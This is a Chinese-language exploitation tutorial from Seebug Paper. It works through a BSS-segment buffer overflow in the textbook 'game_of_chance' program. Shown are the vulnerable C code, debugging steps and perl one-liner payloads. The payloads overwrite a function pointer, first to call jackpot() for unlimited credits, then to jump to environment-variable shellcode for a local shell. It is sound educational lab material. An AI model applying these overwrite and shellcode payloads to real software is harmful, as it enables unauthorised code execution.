作者：M0rk  
作者博客：<https://kevien.github.io/>

#### TL;DR

缓冲区溢出除了典型的[栈溢出](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
"栈溢出")和[堆溢出](https://kevien.github.io/2017/10/28/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/
"堆溢出")外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。[wiki](https://www.wikiwand.com/en/BSS
"wiki")

测试环境ubuntu14.04X86.

###### vul code snippet

from game_of_chance.c

    
    
    // Custom user struct to store information about users 
    struct user {
        int uid;
        int credits;
        int highscore;
        char name[100];
        int (*current_game) ();
    };
    ...
    struct user player;     // Player struct

其中game_of_chance 是如下图的一个小游戏
![](https://images.seebug.org/content/images/2018/03/a2c5e9ed-f8c1-4809-bad6-9674e4281807.png-w331s)

如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：

    
    
    void input_name() {
       char *name_ptr, input_char='\n';
       while(input_char == '\n')    // Flush any leftover 
          scanf("%c", &input_char); // newline chars.
    
       name_ptr = (char *) &(player.name); // name_ptr = player name's address
       while(input_char != '\n') {  // Loop until newline.
          *name_ptr = input_char;   // Put the input char into name field.
          scanf("%c", &input_char); // Get the next char.
          name_ptr++;               // Increment the name pointer.
       }
       *name_ptr = 0;  // Terminate the string.
    }

这个函数会接收用户输入的名字直到用户输入换行符，所以这里并没有有效的限制用户输入，就意味着可以被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：

    
    
    if((choice < 1) || (choice > 7))
           printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
        else if (choice < 4) {  // Othewise, choice was a game of some sort.
              if(choice != last_game) { // If the function ptr isn't set
                 if(choice == 1)        // then point it at the selected game 
                    player.current_game = pick_a_number;   
                 else if(choice == 2)                     
                    player.current_game = dealer_no_match;
                 else
                    player.current_game = find_the_ace;
                 last_game = choice;   // and set last_game.
              }
              play_the_game();   // Play the game.
           }

#### 漏洞利用

如果last_game 未设置，函数指针current_game
会被指向成0或者-1，这时不会触发漏洞，后面last_game被设置成1，当修改完名字完成对current_game覆盖再玩游戏1的时候，进入play_the_game()函数,play_the_game()会有current_game指针变量的调用，此时漏洞即触发！！！

![](https://images.seebug.org/content/images/2018/03/314d8543-22cd-4f74-836e-6801ddf1309c.png-w331s)

我们可以通过ctrl+z挂起当前的进程(这个时候last_game变量被设置成了1(因为刚才玩的是游戏choice是1))，我们找到可以被溢出的变量name，然后通过简单调试看一下name和current_game指针在内存中的位置关系。

![](https://images.seebug.org/content/images/2018/03/ed44f647-d2d5-44e6-8acd-6efffe685f70.png-w331s)

如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试

    
    
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e 'print "A"x100 . "BBBB" . "\n"'
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

![](https://images.seebug.org/content/images/2018/03/01e83c75-c2fe-4d74-8ae7-26963b8656cf.png-w331s)

可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做我们想要做的事情。

nm命令可以查看程序的符号表，来看一下程序有哪些函数以及其对应的内存地址（此思路常用于破解）。

![](https://images.seebug.org/content/images/2018/03/fa6c7f3d-da2e-4faf-bfb5-7f6b3800069e.png-w331s)

jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”

这个程序通过标准输入进行用户交互，我们完全可以使用脚本实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。

    
    
    perl -e 'print "1\n7\nn\n7\n"' | ./game_of_chance

同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。

    
    
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\xa5\x8c\x04\x08\n" . "1\nn\n" . "7\n"' | ./game_of_chance 
    -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: M0rk]
    [You have 90 credits] ->  
    [DEBUG] current_game pointer @ 0x08048f15
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 11
    Sorry, you didn't win.
    You now have 80 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: M0rk]
    [You have 80 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
    [You have 80 credits] ->  
    [DEBUG] current_game pointer @ 0x08048ca5
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    You now have 180 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
    [You have 180 credits] ->  
    Thanks for playing! Bye.
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$

可以看到函数被调用我们增加了100金币

因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：

    
    
    perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\xa5\x8c\x04\x08\n" . "1\n" ."y\n"x10.  "n\n5\nM0rk\n7\n"' | ./game_of_chance

![](https://images.seebug.org/content/images/2018/03/88ea4032-e7ef-497f-92e0-6bd484a1c112.png-w331s)

到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载系统变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。

    
    
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE
    ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j
                                                              XQh//shh/bin��Q��S��̀
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance
    SHELLCODE will be at 0xbffff206
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e 'print "1\n7\nn\n5\n" . "A"x100 . "\x06\xf2\xff\xbf\n" . "1\n"' > exploit_buff
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance 
    -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: M0rk]
    [You have 1260 credits] ->  
    [DEBUG] current_game pointer @ 0x08048f15
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 6
    Sorry, you didn't win.
    You now have 1250 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: M0rk]
    [You have 1250 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]
    [You have 1250 credits] ->  
    [DEBUG] current_game pointer @ 0xbffff206
    id
    uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)

#### 相关源码下载

[github repo](https://github.com/kevien/exploitcode "github repo")

#### reference

《Hacking the art of exploitation》0x342

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/548/>

